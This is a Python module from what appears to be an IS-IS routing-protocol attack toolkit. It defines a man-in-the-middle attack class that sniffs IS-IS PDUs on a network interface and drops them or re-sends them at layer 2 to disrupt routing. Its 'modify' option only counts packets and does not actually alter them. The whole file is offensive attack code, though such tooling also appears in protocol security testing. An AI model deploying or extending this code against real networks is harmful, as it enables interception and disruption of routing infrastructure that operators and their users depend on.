import threading
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import MITMConfig
from isis_attack.core.packet import parse_isis_packet
from isis_attack.core.sniffer import Sniffer, HAS_PCAP
from isis_attack.network.sender import PacketSender


class MITMAttack(BaseAttack):
    name = "mitm"
    description = "中间人攻击：拦截 ISIS PDU → 篡改 → 转发"
    category = AttackCategory.PROTOCOL
    needs_repeated = True
    config: MITMConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        self._sniffer = Sniffer(iface=self.config.iface) if HAS_PCAP else None
        self._intercepted = 0
        self._modified = 0

    def send_one_round(self) -> bool:
        if self._sniffer is None or not self._sniffer.available:
            return False
        self._sniffer.start(timeout=3)
        packets = self._sniffer.stop()

        for raw_pkt in packets:
            self._intercepted += 1
            try:
                pkt = parse_isis_packet(raw_pkt)
                if pkt is None:
                    continue
                if self.config.action == "drop":
                    self._modified += 1
                    continue
                if self.config.action == "modify":
                    self._modified += 1
                self._sender.send_l2(pkt)
            except Exception:
                pass
        return len(packets) > 0

    def launch(self) -> AttackResult:
        ok = self.send_one_round()
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"MITM: intercepted={self._intercepted}, modified={self._modified}, action={self.config.action}",
        )

    def verify(self) -> bool:
        return self._modified > 0
